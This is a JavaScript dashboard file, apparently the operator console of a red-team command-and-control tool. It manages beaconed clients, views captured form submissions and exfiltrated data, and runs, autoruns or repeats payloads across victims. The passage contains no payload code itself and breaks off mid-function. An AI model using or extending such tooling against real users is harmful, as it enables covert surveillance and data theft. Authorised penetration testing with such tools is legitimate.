// Unicode-safe base64 helpers (btoa/atob only handle Latin-1)
function unicodeBtoa(str) {
	return btoa(String.fromCharCode(...new TextEncoder().encode(str)));
}
function unicodeAtob(str) {
	return new TextDecoder().decode(Uint8Array.from(atob(str), c => c.charCodeAt(0)));
}

let selectedClientId = "";
let lastSelectedAppId = "";
let lastSelectedBrowserId = "";
let lastSelectedElectronId = "";
let lastSelectedNodeId = "";
let refreshingDetails = false;
let activeBexTab = 'loot'; // 'loot' or 'tools'
let tokenUrl         = "";
let tokenLocation    = "";
let tokenKey         = "";

let clientUpdateRate = 5;
let updateTimer = setInterval(updateClients, (clientUpdateRate * 1000));



// Syntax highlighting code editor
let codeEditor;
let codeEditorLoaded = false;
let codeEditorBig    = false;

// initialized booleans
let appSettingsEvents = false;


// Lazy loading stuff
let clientLoadCount       = 30;
let clientLoadExtraCount  = 0;
let clientIncrementAmount = 20;

// Client arrival tracking
let _prevAppCount = -1;
let _prevBrowserCount = -1;
let _prevElectronCount = -1;
let _prevNodeCount = -1;
let _soundEnabled = localStorage.getItem('jstap_sound_notifications') !== 'false';

function playChime(type) {
    if (!_soundEnabled) return;
    try {
        var ctx = new (window.AudioContext || window.webkitAudioContext)();
        var osc = ctx.createOscillator();
        var gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        gain.gain.value = 0.15;
        if (type === 'app') {
            // Two-tone rising chime for app clients
            osc.type = 'sine';
            osc.frequency.setValueAtTime(660, ctx.currentTime);
            osc.frequency.setValueAtTime(880, ctx.currentTime + 0.12);
        } else {
            // Three-tone descending chime for browser clients
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(880, ctx.currentTime);
            osc.frequency.setValueAtTime(740, ctx.currentTime + 0.1);
            osc.frequency.setValueAtTime(660, ctx.currentTime + 0.2);
        }
        gain.gain.setValueAtTime(0.15, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.4);
        osc.onended = function() { ctx.close(); };
    } catch(e) { /* AudioContext not available */ }
}


function initializeCodeMirror()
{
	if (!codeEditorLoaded)
	{
		//console.log("Instantiating code editor");
		var textArea = document.getElementById('payload-editor');

		codeEditor = CodeMirror.fromTextArea(textArea,  {
			value: "",
			mode:  "javascript",
			lineNumbers: false,
			theme: "default"
		});

		codeEditorLoaded = true;
		codeEditor.refresh();
	}
}




function escapeHTML(string) 
{
	if (string === undefined || string === null) 
	{
		return '';
	}

	return String(string)
	.replace(/&/g, "&amp;")
	.replace(/</g, "&lt;")
	.replace(/>/g, "&gt;")
	.replace(/"/g, "&quot;")
	.replace(/'/g, "&#039;");
}


// Data stores for safe onclick lookups (avoids embedding data in onclick attributes)
var _mimicData = {};
var _clientData = {};


function showToast(message, type) {
    type = type || 'success';
    var container = document.getElementById('toast-container');
    if (!container) return;
    var bgClass = type === 'success' ? 'bg-success' : type === 'danger' ? 'bg-danger' : type === 'warning' ? 'bg-warning text-dark' : 'bg-info';
    var toastEl = document.createElement('div');
    toastEl.className = 'toast align-items-center text-white border-0 ' + bgClass;
    toastEl.setAttribute('role', 'alert');
    toastEl.innerHTML = '<div class="d-flex"><div class="toast-body">' + escapeHTML(message) + '</div><button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div>';
    container.appendChild(toastEl);
    var toast = new bootstrap.Toast(toastEl, { delay: 3000 });
    toast.show();
    toastEl.addEventListener('hidden.bs.toast', function() { toastEl.remove(); });
}


function showConfirmModal(title, message, callback) {
    var modalEl = document.getElementById('confirmModal');
    document.getElementById('confirmModalTitle').textContent = title;
    document.getElementById('confirmModalBody').textContent = message;
    var okBtn = document.getElementById('confirmModalOk');
    var modal = new bootstrap.Modal(modalEl);
    var newOk = okBtn.cloneNode(true);
    okBtn.parentNode.replaceChild(newOk, okBtn);
    newOk.addEventListener('click', function() {
        modal.hide();
        callback(true);
    });
    modalEl.addEventListener('hidden.bs.modal', function handler() {
        modalEl.removeEventListener('hidden.bs.modal', handler);
    });
    modal.show();
}


function showPromptModal(title, message, defaultValue, callback) {
    var modalEl = document.getElementById('promptModal');
    document.getElementById('promptModalTitle').textContent = title;
    document.getElementById('promptModalBody').textContent = message;
    var input = document.getElementById('promptModalInput');
    input.value = defaultValue || '';
    var okBtn = document.getElementById('promptModalOk');
    var modal = new bootstrap.Modal(modalEl);
    var newOk = okBtn.cloneNode(true);
    okBtn.parentNode.replaceChild(newOk, okBtn);
    newOk.addEventListener('click', function() {
        var val = input.value;
        modal.hide();
        if (val) callback(val);
    });
    modal.show();
    setTimeout(function() { input.focus(); input.select(); }, 300);
}


function downloadCaCert() {
    fetch('/api/proxy/ca_cert')
        .then(function(resp) {
            if (!resp.ok) throw new Error('Download failed: ' + resp.status);
            return resp.blob();
        })
        .then(function(blob) {
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'jstap-proxy-ca.pem';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        })
        .catch(function(err) {
            alert('CA cert download failed: ' + err.message);
        });
}


function showInjectOptionsModal(domain, callback) {
    var modalEl = document.getElementById('injectOptionsModal');
    document.getElementById('injectOptionsDomain').textContent = 'Target: ' + domain;
    var tagInput = document.getElementById('injectTagInput');
    var serverInput = document.getElementById('injectServerInput');
    tagInput.value = 'bex-injected';
    serverInput.value = window.location.origin; // temporary default until fetch completes
    fetch('/api/jstap/server_url').then(function(r) { return r.json(); }).then(function(data) {
        if (data.serverUrl) serverInput.value = data.serverUrl;
    });
    var okBtn = document.getElementById('injectOptionsOk');
    var modal = new bootstrap.Modal(modalEl);
    var newOk = okBtn.cloneNode(true);
    okBtn.parentNode.replaceChild(newOk, okBtn);
    newOk.addEventListener('click', function() {
        var tag = tagInput.value.trim();
        var serverUrl = serverInput.value.trim();
        if (!tag) { tagInput.focus(); return; }
        if (serverUrl && !serverUrl.startsWith('http')) { serverInput.focus(); return; }
        modal.hide();
        callback(tag, serverUrl);
    });
    modal.show();
    setTimeout(function() { tagInput.focus(); tagInput.select(); }, 300);
}


function showClientFilterModal()
{
	var modal = new bootstrap.Modal(document.getElementById("clientFilterModal"));
	modal.show();
}



function toggleStar(imgObject, event, client, nickname)
{
	// console.log("Top of toggleStar");
	var starred = "";

	if (imgObject.src.includes('star.svg'))
	{
		imgObject.src = '/protectedStatic/star-fill.svg';
		// console.log("Filling star...");

		starred = true;
	}
	else
	{
		imgObject.src = '/protectedStatic/star.svg';
		// console.log("Emptying star...");

		starred = false;
	}

	// Block resetting of loot card stack
	event.stopPropagation();



	// Send star to server for database
	fetch('/api/updateClientStar/' + client, {
		method:"POST",
		body: JSON.stringify({
			isStarred: starred
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}



function blockIP()
{
	var inputField = document.getElementById('ipInput');
	var ipAddress  = inputField.value;

	const ipv4Regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;

	if (ipv4Regex.test(ipAddress)) 
	{
		fetch('/api/blockIP', {
			method:"POST",
			body: JSON.stringify({
				ip: ipAddress
			}),
			headers: {
				"Content-type": "application/json; charset=UTF-8"
			}
		})
		.then(response => {
			inputField.value = "";
			refreshBlockedIPList();
			showToast('IP ' + ipAddress + ' blocked');
		});
	}
	else
	{
		showToast('Invalid IPv4 address', 'warning');
	}

	inputField.value = "";
	refreshBlockedIPList();
}



function addEmail()
{
	var inputField = document.getElementById('emailInput');
	var address    = inputField.value;

	const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;

	if (emailRegex.test(address))
	{
		fetch('/api/addTargetEmail', {
			method:"POST",
			body: JSON.stringify({
				emailAddress: address
			}),
			headers: {
				"Content-type": "application/json; charset=UTF-8"
			}
		})
		.then(response => {
			inputField.value = "";
			refreshTargetEmailList();
			showToast('Email recipient added');
		});
	}
	else
	{
		showToast('Invalid email address', 'warning');
	}

	inputField.value = "";
	refreshTargetEmailList();
}



function blockClient(imgObject, event, client, nickname)
{
	console.log("Blocking client: " + nickname);
	console.log("Client id: " + client);

	showConfirmModal('Block Client', 'Do you want to block ' + nickname + ' from uploading additional events? This will invalidate their session.', function() {
		console.log("Blocking client session");
		fetch('/api/blockClientSession/' + client);
	});

	// Block resetting of loot card stack
	event.stopPropagation();
}



function selectAllEvents()
{
	var filterModal = document.getElementById('eventFilterModal');
	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');

	checkboxes.forEach(function(checkbox)
	{
		checkbox.checked = true;
	});
	updateEventFilterDot();
}


function selectNoEvents()
{
	var filterModal = document.getElementById('eventFilterModal');
	var checkboxes  = filterModal.querySelectorAll('input[type="checkbox"]');

	checkboxes.forEach(function(checkbox)
	{
		checkbox.checked = false;
	});
	updateEventFilterDot();
}


function showEventFilterModal()
{
	var modal = new bootstrap.Modal(document.getElementById("eventFilterModal"));
	modal.show();
}


function updateEventFilterDot() {
	var btn = document.getElementById('eventFilterBtn');
	if (!btn) return;
	var existing = btn.querySelector('.filter-dot');
	var filterModal = document.getElementById('eventFilterModal');
	var checkboxes = filterModal.querySelectorAll('input[type="checkbox"]');
	var anyUnchecked = false;
	checkboxes.forEach(function(cb) { if (!cb.checked) anyUnchecked = true; });
	var sortChanged = document.getElementById('lootSortNewest').checked;
	var isNonDefault = anyUnchecked || sortChanged;
	if (isNonDefault && !existing) {
		var dot = document.createElement('span');
		dot.className = 'filter-dot';
		btn.appendChild(dot);
	} else if (!isNonDefault && existing) {
		existing.remove();
	}
}

function updateClientFilterDot() {
	var btn = document.getElementById('clientFilterBtn');
	if (!btn) return;
	var existing = btn.querySelector('.filter-dot');
	var isDefault = document.getElementById('lastSeenDescending').checked && !document.getElementById('onlyStarredClients').checked;
	if (!isDefault && !existing) {
		var dot = document.createElement('span');
		dot.className = 'filter-dot';
		btn.appendChild(dot);
	} else if (isDefault && existing) {
		existing.remove();
	}
}


function updateEvents()
{
	updateEventFilterDot();

	// Remove detail cards
	detailCardStack = document.getElementById('detail-stack');
	while (detailCardStack.firstChild)
	{
		detailCardStack.firstChild.remove();
	}

	// Clear tools stack
	var toolsStack = document.getElementById('tools-stack');
	if (toolsStack) {
		while (toolsStack.firstChild) toolsStack.firstChild.remove();
	}

	getClientDetails(selectedClientId);
}



async function showHtmlCode(eventKey)
{
	htmlScrapeReq   = await fetch('/api/clientHtml/' + eventKey);
	htmlScrapeJson  = await htmlScrapeReq.json();
	scrapedHtmlCode = htmlScrapeJson.code;



	prettyPrintCode = window.html_beautify(scrapedHtmlCode, {indent_size: 2});

	modalContent = document.getElementById("code-viewer-body");
	modalContent.innerHTML = prettyPrintCode;

	var modal = new bootstrap.Modal(document.getElementById('codeModal'));
	modal.show();
}



function downloadHtmlCode(fileName)
{
	window.open(fileName, "_blank");
}



async function showExfilViewer(eventKey)
{
	exfilData     = await fetch('/api/clientCustomExfilDetail/' + eventKey);
	exfilDataJson = await exfilData.json();

	var modal = new bootstrap.Modal(document.getElementById('customPayloadExfilModal'));

	document.getElementById("exfil-viewer-title").innerText = "Custom Exfiltration Viewer";
	modalContent = document.getElementById("exfil-data-viewer");

	prettyPrintCode = window.html_beautify(unicodeAtob(exfilDataJson.data), {indent_size: 2});
	modalContent.innerHTML = prettyPrintCode;
	modal.show();
}


function showFormPostViewer(eventKey)
{
	var entry = _mimicData[eventKey];
	if (!entry || !entry.data) return;

	var formData = entry.data;
	var modal = new bootstrap.Modal(document.getElementById('customPayloadExfilModal'));

	document.getElementById("exfil-viewer-title").innerText = "Form Submission Viewer";
	var modalContent = document.getElementById("exfil-data-viewer");

	var text = '';
	text += 'URL: ' + (formData.url || '') + '\n';
	text += 'Form Name: ' + (formData.name || '') + '\n';
	text += 'Action: ' + (formData.action ? unicodeAtob(formData.action) : '') + '\n';
	text += 'Method: ' + (formData.method || '') + '\n\n';
	text += 'Data:\n' + (formData.data ? unicodeAtob(formData.data) : '');

	modalContent.value = text;
	modalContent.innerHTML = '';
	modalContent.textContent = text;
	modal.show();
}



function saveAllNotesToFile()
{
	console.log("** Starting saveAllNotesToFile...");
	const notesContent = document.getElementById("all-note-viewer").innerHTML;

	const noteBlob = new Blob([notesContent], {type:'text/plain'});

	const anchor = document.getElementById('downloadLink');
	anchor.href = URL.createObjectURL(noteBlob);
	anchor.download = 'clientNotes.txt';
	anchor.click();

    // Release the URL object
	URL.revokeObjectURL(anchor.href);
}




async function showAllNotesModal()
{
	var modal = new bootstrap.Modal(document.getElementById("allNoteViewerModal"));

	var req = await fetch('/api/allClientNotes');
	var jsonResponse = await req.json();

	var downloadButton = document.getElementById('note-download-button');


	var noteArea = document.getElementById('all-note-viewer');

	noteArea.innerHTML = "";

	if (jsonResponse.length === 0) {
		noteArea.innerHTML = "No clients have notes.";
	}

	for (let i = 0; i < jsonResponse.length; i++)
	{
		var entry = jsonResponse[i];
		var typeLabel = entry.clientType === 'bex-beacon' ? 'Browser (BEX Beacon)' : entry.clientType === 'atom-beacon' ? 'Electron (Atom Beacon)' : entry.clientType === 'v8-beacon' ? 'Node (V8 Beacon)' : 'App (DOM Beacon)';

		noteArea.innerHTML += "===========================================\n";

		// Header line: type + tag (if set)
		var header = typeLabel;
		if (entry.tag) {
			header += "  |  Tag: " + entry.tag;
		}
		noteArea.innerHTML += header + "\n";

		noteArea.innerHTML += "Nickname:   " + entry.nickname + "\n";
		noteArea.innerHTML += "IP:         " + (entry.ipAddress || 'unknown') + "\n";
		noteArea.innerHTML += "Platform:   " + (entry.platform || 'unknown') + "\n";
		noteArea.innerHTML += "Browser:    " + (entry.browser || 'unknown') + "\n";
		noteArea.innerHTML += "First Seen: " + (entry.firstSeen || 'unknown') + "\n";
		noteArea.innerHTML += "Last Seen:  " + (entry.lastSeen || 'unknown') + "\n";

		// Domains for beacon clients
		if (entry.domains && entry.domains.length > 0) {
			noteArea.innerHTML += "Domains:    " + entry.domains.join(', ') + "\n";
		}

		noteArea.innerHTML += "-------------------------------------------\n";
		noteArea.innerHTML += unicodeAtob(entry.note);
		noteArea.innerHTML += "\n\n";
	}

		// Handle saving modified notes
	downloadButton.onclick = function(event) {
		console.log("Gotta download button press...");
		saveAllNotesToFile();
	}

	modal.show();
}


async function refreshBlockedIPList()
{
	var blockedIPList = document.getElementById('blockedIPList');

	blockedIPList.innerHTML = '';

	// Handle the blocked IPs now
	var req = await fetch('/api/getBlockedIPs');
	var jsonResponse = await req.json();

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id = jsonResponse[i].id;
		ip = jsonResponse[i].ip;

		var blockedIP = document.createElement('li');
		blockedIP.className   = 'list-group-item d-flex justify-content-between align-items-center';
		blockedIP.textContent = ip;
		blockedIP.id          = id;

		var deleteButton = document.createElement('button');
		deleteButton.id          = id;
		deleteButton.ip          = ip;
		deleteButton.className   = 'btn btn-sm me-2';
		deleteButton.textContent = 'Delete';


		deleteButton.addEventListener('click', function()
		{
			// Run on this clients
			deleteBlockedIP(this);
		})

		blockedIP.appendChild(deleteButton);
		blockedIPList.appendChild(blockedIP);
	}
}



async function refreshTargetEmailList()
{
	var targetEmailList = document.getElementById('emailAddressList');

	targetEmailList.innerHTML = '';

	var req = await fetch('/api/getTargetEmails');
	var jsonResponse = await req.json();

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id      = jsonResponse[i].id;
		address = jsonResponse[i].address;

		var targetEmail = document.createElement('li');
		targetEmail.className   = 'list-group-item d-flex justify-content-between align-items-center'; 
		targetEmail.textContent = address;
		targetEmail.id          = id;

		var deleteButton = document.createElement('button');
		deleteButton.id          = id;
		deleteButton.emailAddy   = address;
		deleteButton.className   = 'btn btn-sm me-2';
		deleteButton.textContent = 'Delete';


		deleteButton.addEventListener('click', function()
		{
			// Run on this clients
			deleteTargetEmail(this);
		})

		targetEmail.appendChild(deleteButton);
		targetEmailList.appendChild(targetEmail);
	}
}


async function deleteBlockedIP(button)
{
	await fetch('/api/deleteBlockedIP/' + button.id);

	refreshBlockedIPList();
}



async function deleteTargetEmail(button)
{
	await fetch('/api/deleteTargetEmail/' + button.id);

	refreshTargetEmailList();
}



async function showAppSettingsModal()
{
	var modal = new bootstrap.Modal(document.getElementById("clientSessionModal"));

	// Is traffic obfuscation enabled?
	var obfuscateReq      = await fetch('/api/app/obfuscateTraffic');
	var obfuscateResponse = await obfuscateReq.json();

	// Let's figure out if new sessions are allowed right now
	var req          = await fetch('/api/app/allowNewClientSessions');
	var jsonResponse = await req.json();

	// Get our current client refresh delay
	var delayRequest  = await fetch('/api/app/clientRefreshRate');
	var delayResponse = await delayRequest.json();

	var obfuscateSwitch = document.getElementById('obfuscateTraffic');
	var checkBox        = document.getElementById('allowNewClientSessions');
	var clientDelay     = document.getElementById('clientRefreshDelay');


	var saveButton      = document.getElementById('saveEmailSettings');
	var testEmailButton = document.getElementById('sendTestEmail');

	var serverString  = document.getElementById('smtpServer');
	var emailUsername = document.getElementById('emailUsername');
	var emailPassword = document.getElementById('emailPassword');
	var notifyEvent   = document.getElementById('emailNotificationType');
	var emailDelay    = document.getElementById('emailDelay');
	var emailEnable   = document.getElementById('enableEmails');

	var fingerprintEnable = document.getElementById('showFingerprints');
	var soundToggle       = document.getElementById('enableSoundNotifications');

	// Sound notifications are client-side (localStorage)
	soundToggle.checked = _soundEnabled;

	var emailData     = await fetch('/api/app/getEmailSettings');
	var emailDataJson = await emailData.json();

	serverString.value  = emailDataJson.emailServer;
	emailUsername.value = emailDataJson.username;
	emailPassword.value = emailDataJson.password;
	emailDelay.value    = emailDataJson.delay;


	switch(emailDataJson.eventType)
	{
	case 'newClients':
		notifyEvent.value = "newClients";
		break;
	case 'newClientsAndEvents':
		notifyEvent.value = "newClientsAndEvents";
		break;
	case 'None':
		notifyEvent.value = "newClients";
		break;
	default:
		showToast("Error parsing email notification event type: " + emailDataJson.eventType, 'danger');
	}

	var emailsEnabledReq  = await fetch('/api/app/getEmailNotificationSetting');
	var emailsEnabledJson = await emailsEnabledReq.json();

	if (emailsEnabledJson.emailEnable)
	{
		emailEnable.checked  = true;
	}
	else
	{
		emailEnable.checked = false;
	}

	clientDelay.value = delayResponse.clientRefreshRate;


	if (obfuscateResponse.obfuscateTraffic == '1')
	{
		obfuscateSwitch.checked = true;
	}
	else
	{
		obfuscateSwitch.checked = false;
	}


	if (jsonResponse.newSessionsAllowed == '1')
	{
			// console.log("Server says sessions are allowed!");
		checkBox.checked == true;
	}
	else
	{
			// console.log("Server says no more client sessions!");
		checkBox.checked == false;
	}




	if (!appSettingsEvents)
	{
		obfuscateSwitch.addEventListener('change', function()
		{
			if (obfuscateSwitch.checked)
			{
				console.log("Turning on obfuscation!");
				fetch('/api/app/setObfuscateTraffic/true');
			}
			else
			{
				console.log("Turning off obfuscation!");
				fetch('/api/app/setObfuscateTraffic/false');
			}
		});

		notifyEvent.addEventListener('change', function()
		{
			console.log("^^^^^ event type now: " + notifyEvent.value)
		});

		emailEnable.addEventListener('change', function()
		{
			if (emailEnable.checked)
			{
			// enable
				fetch('/api/app/enableEmailNotifications/true');
				console.log("Turning on email notifications");
			}
			else
			{
			// disabled
				fetch('/api/app/enableEmailNotifications/false');
				console.log("Turning off email notifications");
			}
		});



		fingerprintEnable.addEventListener('change', function()
		{
			if (fingerprintEnable.checked)
			{
				// enable
				fetch('/api/app/showFingerprint/true');
			}
			else
			{
				// disable
				fetch('/api/app/showFingerprint/false');
			}
		});

		soundToggle.addEventListener('change', function()
		{
			_soundEnabled = soundToggle.checked;
			localStorage.setItem('jstap_sound_notifications', _soundEnabled ? 'true' : 'false');
		});


		clientDelay.addEventListener('change', function()
		{
			if (clientDelay.value < 1)
			{
				clientDelay.value = 1;
			}
			else if (clientDelay.value > 3600)
			{
				clientDelay.value = 3600;
			}

			fetch('/api/app/setClientRefreshRate/' + clientDelay.value);
			clientUpdateRate = clientDelay.value;
			clearInterval(updateTimer);
			updateTimer = setInterval(updateClients, (clientUpdateRate * 1000));
		});


		saveButton.addEventListener('click', function()
		{

			console.log("*** Saving email settings...");

			fetch('/api/app/saveEmailSettings', {
				method:"POST",
				body: JSON.stringify({
					emailServer: serverString.value,
					username: emailUsername.value,
					password: emailPassword.value,
					eventType: notifyEvent.value,
					delay: emailDelay.value
				}),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			}).then(function() {
				showToast('Email settings saved');
			});

			saveButton.blur();
		});


		testEmailButton.addEventListener('click', function()
		{
			console.log("Sending test email...");
			fetch('/api/sendTestEmail').then(function() {
				showToast('Test email sent');
			});

			testEmailButton.blur();
		});

		appSettingsEvents = true;
	}


	refreshBlockedIPList();
	refreshTargetEmailList();

	modal.show();
}




function importPayloads(event)
{
	const file   = event.target.files[0];
	const reader = new FileReader();

	reader.onload = function(event)
	{
		const fileContent = event.target.result;

		try 
		{
			const jsonData = JSON.parse(fileContent);

			fetch('/api/savePayloads', {
				method:"POST",
				body: JSON.stringify(jsonData),
				headers: {
					"Content-type": "application/json; charset=UTF-8"
				}
			})
			.then(response => {
				refreshSavedPayloadList();
			});		
		}
		catch (error)
		{
			showToast("Error parsing payloads file. See README for formatting.", 'danger');
			console.error('An error occurred:', error);
			console.log('Error name:', error.name);
			console.log('Error message:', error.message);
			console.log('Stack trace:', error.stack);
		}
	}
	reader.readAsText(file);
	document.getElementById('payload-import-button').blur();
	event.target.value = "";
	refreshSavedPayloadList();
}



async function exportAllPayloads(button)
{
	payloadResponse = await fetch('/api/getAllPayloads');
	payloadJson     = await payloadResponse.json();

	const payloadString = JSON.stringify(payloadJson);
	const payloadBlob = new Blob([payloadString], {type:'text/plain'});

	const anchor = document.getElementById('exportLink');
	anchor.href  = URL.createObjectURL(payloadBlob);
	anchor.download = 'customPayloadExport.json';
	anchor.click();

	URL.revokeObjectURL(anchor.href);

	button.blur();
}



async function selectPayload(payload)
{
	// Remove highlight from all payload items
	var allItems = document.querySelectorAll('#savedPayloadsList > li');
	for (var i = 0; i < allItems.length; i++)
	{
		allItems[i].classList.remove('table-active');
	}
	payload.classList.add('table-active');

	codeResponse = await fetch('/api/getSavedPayloadCode/' + payload.id);
	codeJson     = await codeResponse.json();
	description  = unicodeAtob(codeJson.description);
	code         = unicodeAtob(codeJson.code);

	var payloadNameInput   = document.getElementById('payloadName');
	var payloadDescription = document.getElementById('payloadDescription');
	// var payloadCode        = document.getElementById('payload-editor');

	payloadNameInput.value   = payload.name;
	payloadDescription.value = description;
	codeEditor.setValue(code);
}




async function autorunPayload(autorunToggle)
{
	var autorun = false;

    // Toggle button functionality
	if (autorunToggle.classList.contains('active'))
	{
        // If the button is active, deactivate it
		autorunToggle.classList.remove('active');
		autorunToggle.style.borderWidth = '';
		autorunToggle.style.borderColor = '';
		autorun = false;
	} 
	else 
	{
        // If the button is inactive, activate it
		autorunToggle.classList.add('active');
		autorunToggle.style.borderWidth = '2px';
		autorunToggle.style.borderColor = 'green';
		autorun = true;
	}

	// Update autorun status server side
	fetch('/api/setPayloadAutorun', {
		method:"POST",
		body: JSON.stringify({
			name: autorunToggle.name,
			autorun: autorun
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}



async function runPayloadAllClient(button)
{
	await fetch('/api/runPayloadAllClients/' + button.id);
	button.style.borderWidth = '2px';
	button.style.borderColor = 'green';

	setTimeout(function()
	{
		button.style.borderWidth = '';
		button.style.borderColor = '';
	}, 750);
}



async function repeatPayloadAllClients(repeatRunToggle)
{
	var repeatrun = false;

	//Toggle functionality
	if (repeatRunToggle.classList.contains('active'))
	{
        // If the button is active, deactivate it
		repeatRunToggle.classList.remove('active');
		repeatRunToggle.style.borderWidth = '';
		repeatRunToggle.style.borderColor = '';
		repeatrun = false;
	} 
	else 
	{
        // If the button is inactive, activate it
		repeatRunToggle.classList.add('active');
		repeatRunToggle.style.borderWidth = '2px';
		repeatRunToggle.style.borderColor = 'green';
		repeatrun = true;
	}


	// Update autorun status server side
	fetch('/api/setPayloadRepeatRun', {
		method:"POST",
		body: JSON.stringify({
			name: repeatRunToggle.name,
			repeatrun: repeatrun
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}


async function repeatPayloadClient(repeatRunToggle)
{
	var repeatrun = false;

	var payloadId = repeatRunToggle.id;
	var clientId  = repeatRunToggle.client;


	//Toggle functionality
	if (repeatRunToggle.classList.contains('active'))
	{
        // If the button is active, deactivate it
		repeatRunToggle.classList.remove('active');
		repeatRunToggle.style.borderWidth = '';
		repeatRunToggle.style.borderColor = '';
		repeatrun = false;
	} 
	else 
	{
        // If the button is inactive, activate it
		repeatRunToggle.classList.add('active');
		repeatRunToggle.style.borderWidth = '2px';
		repeatRunToggle.style.borderColor = 'green';
		repeatrun = true;
	}


	// Update repeatrun status server side
	fetch('/api/singleClientPayloadRepeatRun', {
		method:"POST",
		body: JSON.stringify({
			name: repeatRunToggle.name,
			clientID: clientId,
			repeatrun: repeatrun
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});
}





async function runPayloadSingleClient(button, modal)
{
	var payloadId = button.id;
	var clientId  = button.client;

	fetch('/api/runPayloadSingleClient', {
		method:"POST",
		body: JSON.stringify({
			payloadKey: payloadId,
			clientKey: clientId
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8"
		}
	});

	button.style.borderWidth = '2px';
	button.style.borderColor = 'green';

	setTimeout(function()
	{
		button.style.borderWidth = '';
		button.style.borderColor = '';
		// modal.hide();
	}, 750);
}



function showSingleClientPayloadModal(event, client)
{
	var modal = new bootstrap.Modal(document.getElementById('singleClientPayloadModal'));
	var savedPayloadsList = document.getElementById('singleClientPayloadList');

	refreshSingleClientPayloadList(client, modal);
	modal.show();
	// Block resetting of loot card stack
	event.stopPropagation();
}



async function deletePayload(event, button)
{
	await fetch('/api/deletePayload/' + button.id);
	refreshSavedPayloadList();
}


async function refreshSingleClientPayloadList(client, modal)
{
	var savedPayloadsList = document.getElementById('singleClientPayloadList');

	savedPayloadsList.innerHTML = '';

	// Let's get our saved payloads from the database
	var req = await fetch('/api/getPayloadsForClient/' + client);
	var jsonResponse = await req.json();

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id        = jsonResponse[i].id;
		name      = jsonResponse[i].name;
		repeatrun = jsonResponse[i].repeatrun;


		var payload = document.createElement('li');
		payload.className   = 'list-group-item d-flex justify-content-between align-items-center';
		payload.name        = name;
		payload.id          = id;

		var nameStrong = document.createElement('strong');
		nameStrong.textContent = name;
		payload.appendChild(nameStrong);

		var executePayloadButton         = document.createElement('button');
		executePayloadButton.id          = id;
		executePayloadButton.client      = client;
		executePayloadButton.className   = 'btn btn-sm me-2';
		executePayloadButton.textContent = 'Run';
		executePayloadButton.setAttribute('data-toggle', 'tooltip');
		executePayloadButton.setAttribute('title', 'Run Payload on this Client');


		executePayloadButton.addEventListener('click', function()
		{
			// Run on this clients
			runPayloadSingleClient(this, modal);
		})


		var repeatPayloadToggle         = document.createElement('button');
		repeatPayloadToggle.id          = id;
		repeatPayloadToggle.className   = 'btn btn-sm me-2';
		repeatPayloadToggle.textContent = 'Repeat';
		repeatPayloadToggle.name        = name;
		repeatPayloadToggle.client      = client;

		repeatPayloadToggle.setAttribute('data-toggle', 'tooltip');
		repeatPayloadToggle.setAttribute('title', 'Repeatedly rerun Payload on this Client');


		repeatPayloadToggle.addEventListener('click', function()
		{
			// Run on all clients
			repeatPayloadClient(this, modal);
		})


		// If it was already toggled on in the database, make sure we reflect that here
		if (repeatrun)
		{
			repeatPayloadToggle.classList.add('active');
			repeatPayloadToggle.style.borderWidth = '2px';
			repeatPayloadToggle.style.borderColor = 'green';
		}

		var spacerDiv = document.createElement('div');
		spacerDiv.className = 'ms-auto'; 

		payload.appendChild(spacerDiv);
		payload.appendChild(repeatPayloadToggle);
		payload.appendChild(executePayloadButton);
		savedPayloadsList.appendChild(payload);
	}
}





async function refreshSavedPayloadList()
{
	var savedPayloadsList = document.getElementById('savedPayloadsList');

	savedPayloadsList.innerHTML = '';

	// Let's get our saved payloads from the database
	var req = await fetch('/api/getSavedPayloads');
	var jsonResponse = await req.json();

	// Fire all target rule fetches in parallel
	var rulePromises = jsonResponse.map(function(p) {
		return fetch('/api/payload/' + p.id + '/targetRules').then(function(r) { return r.json(); });
	});
	var allRules = await Promise.all(rulePromises);

	for (let i = 0; i < jsonResponse.length; i++)
	{
		id          = jsonResponse[i].id;
		name        = jsonResponse[i].name;
		autorun     = jsonResponse[i].autorun;
		repeatrun   = jsonResponse[i].repeatrun;

		var payload = document.createElement('li');
		payload.className   = 'list-group-item d-flex justify-content-between align-items-center';
		payload.name        = name;
		payload.id          = id;

		var nameStrong = document.createElement('strong');
		nameStrong.textContent = name;
		payload.appendChild(nameStrong);

		payload.addEventListener('click', function()
		{
			selectPayload(this);
		});


		var autorunToggle         = document.createElement('button');
		autorunToggle.type        = 'button';
		autorunToggle.className   = 'btn btn-sm btn-toggle me-2';
		autorunToggle.textContent = 'Autorun';
		autorunToggle.name        = name;
		autorunToggle.setAttribute('data-toggle', 'tooltip');
		autorunToggle.setAttribute('title', 'Automatically Run Payload on All New Clients Once');


		autorunToggle.addEventListener('click', function()
		{
			autorunPayload(this);
		});

		// If it was already toggled on in the database, make sure we reflect that here
		if (autorun)
		{
			console.log("On payload load: " + autorunToggle.name + " should be toggled on autorun");
			autorunToggle.classList.add('active');
			autorunToggle.style.borderWidth = '2px';
			autorunToggle.style.borderColor = 'green';
		}

